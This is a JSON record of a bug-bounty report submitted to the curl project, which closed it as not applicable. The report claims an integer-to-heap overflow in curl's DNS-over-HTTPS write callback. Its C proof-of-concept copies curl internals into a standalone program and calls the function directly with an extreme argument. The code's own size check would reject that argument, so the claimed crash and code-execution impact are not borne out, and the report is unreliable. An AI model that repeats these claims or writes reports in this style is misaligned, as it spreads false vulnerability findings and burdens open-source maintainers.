@@ -1,0 +1,118 @@
+{
+  "id": 3399774,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzk5Nzc0",
+  "url": "https://hackerone.com/reports/3399774",
+  "title": "Integer Overflow to Heap Overflow in DoH Response Handling",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "readable_substate": "N/A",
+  "created_at": "2025-10-25T20:12:34.215Z",
+  "submitted_at": "2025-10-25T20:12:34.470Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "asdkjhasldkjahslfdkjfa",
+    "url": "/asdkjhasldkjahslfdkjfa",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-10-25T22:04:59.315Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-10-25T22:04:46.915Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nAn integer overflow vulnerability exists in the `doh_probe_write_cb` function in `lib/doh.c`. This function is used as a write callback for DNS-over-HTTPS (DoH) responses. When a malicious DoH server sends a response with a crafted size, the multiplication of `size` and `nmemb` can overflow. This leads to the allocation of a smaller-than-expected buffer on the heap, but the function returns the wrapped-around, incorrect size. This discrepancy can lead to a heap overflow when the caller subsequently tries to access the buffer, resulting in a crash or potential arbitrary code execution.\n\n## Affected version\nThis vulnerability was found on the current master branch of the curl repository. It can be reproduced on a standard Linux build.\n\n## Steps To Reproduce:\n1.  Save the following Proof-of-Concept code as `poc.c` in the root of the curl project directory:\n    ```c\n    #include <stdio.h>\n    #include <string.h>\n    #include <stdlib.h>\n\n    #define CURL_STATICLIB\n    #include <curl/curl.h>\n\n    // --- From curl/lib/curlx/dynbuf.h ---\n    struct dynbuf {\n      char *bufr;\n      size_t leng;\n      size_t allc;\n      size_t toobig;\n    };\n\n    #define DYN_DOH_RESPONSE    3000\n\n    // --- From curl/lib/curlx/dynbuf.c ---\n    void curlx_dyn_init(struct dynbuf *s, size_t toobig)\n    {\n      s->bufr = NULL;\n      s->leng = 0;\n      s->allc = 0;\n      s->toobig = toobig;\n    }\n\n    void curlx_dyn_free(struct dynbuf *s)\n    {\n      free(s->bufr);\n      s->bufr = NULL;\n      s->leng = 0;\n      s->allc = 0;\n    }\n\n    CURLcode dyn_nappend(struct dynbuf *s, const unsigned char *mem, size_t len)\n    {\n      size_t idx = s->leng;\n      size_t a = s->allc;\n      size_t fit = len + idx + 1;\n\n      if(len > s->toobig - idx - 1) { // check for overflow before addition\n        return CURLE_TOO_LARGE;\n      }\n\n      if(!a) {\n        a = fit;\n      }\n      else {\n        while(a < fit)\n          a *= 2;\n      }\n\n      if(a != s->allc) {\n        void *p = realloc(s->bufr, a);\n        if(!p) {\n          curlx_dyn_free(s);\n          return CURLE_OUT_OF_MEMORY;\n        }\n        s->bufr = p;\n        s->allc = a;\n      }\n\n      if(len)\n        memcpy(&s->bufr[idx], mem, len);\n      s->leng = idx + len;\n      s->bufr[s->leng] = 0;\n      return CURLE_OK;\n    }\n\n    CURLcode curlx_dyn_addn(struct dynbuf *s, const void *mem, size_t len)\n    {\n      return dyn_nappend(s, (const unsigned char *)mem, len);\n    }\n\n    size_t curlx_dyn_len(const struct dynbuf *s)\n    {\n      return s->leng;\n    }\n\n    // --- From curl/lib/doh.h ---\n    struct doh_request {\n      unsigned char req_body[256 + 16];\n      void *req_hds;\n      struct dynbuf resp_body;\n      size_t req_body_len;\n      int dnstype;\n    };\n\n    // This is a copy of the vulnerable function from doh.c\n    size_t doh_probe_write_cb(char *contents, size_t size, size_t nmemb, void *userp)\n    {\n      size_t realsize = size * nmemb;\n      struct doh_request *doh_req = (struct doh_request *)userp;\n\n      if(!doh_req)\n        return -1; // CURL_WRITEFUNC_ERROR\n\n      // The vulnerability is that curlx_dyn_addn is called with a wrapped-around\n      // realsize, which can be very large. This PoC will crash here.\n      if(curlx_dyn_addn(&doh_req->resp_body, contents, realsize))\n        return 0;\n\n      return realsize;\n    }\n\n    int main(void)\n    {\n      struct doh_request doh_req;\n      size_t size = 1;\n      size_t nmemb = (size_t)-1; // This will cause an integer overflow\n      char *contents = \"A\";\n\n      printf(\"Simulating a call to doh_probe_write_cb with:\\n\");\n      printf(\"size = %zu\\n\", size);\n      printf(\"nmemb = %zu\\n\", nmemb);\n\n      // Initialize the dynamic buffer\n      curlx_dyn_init(&doh_req.resp_body, DYN_DOH_RESPONSE);\n\n      // This call will crash, demonstrating the vulnerability.\n      doh_probe_write_cb(contents, size, nmemb, &doh_req);\n\n      // This part will not be reached.\n      printf(\"This message should not be printed.\\n\");\n      curlx_dyn_free(&doh_req.resp_body);\n\n      return 0;\n    }\n    ```\n2.  Compile the PoC with the following command:\n    ```bash\n    gcc -o poc poc.c -lcurl\n    ```\n3.  Run the PoC:\n    ```bash\n    ./poc\n    ```\n4.  Observe the output and the crash. The program will crash with a segmentation fault, which demonstrates the vulnerability.\n\n## Supporting Material/References:\n*   Vulnerable source code: `lib/doh.c` (function `doh_probe_write_cb`)\n*   `lib/doh.h`\n*   `lib/curlx/dynbuf.h`\n*   `lib/curlx/dynbuf.c`\n\n## Impact\n\n## Summary\nAn attacker who can control a malicious DoH server can exploit this vulnerability to cause a heap overflow in the libcurl client application. This can lead to a denial of service (crash) or, potentially, arbitrary code execution in the context of the application using libcurl. Given the widespread use of libcurl, the impact of this vulnerability is high.",
+  "weakness": {
+    "id": 5,
+    "name": "Heap Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 18,
+  "voters": [
+    "almuntadhar0x01",
+    "thalaivar304",
+    "2026",
+    "wefega",
+    "edyw",
+    "filthypotatoxx",
+    "zomakin",
+    "sshabib",
+    "snethemba12334567890",
+    "godon12as",
+    "and 8 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
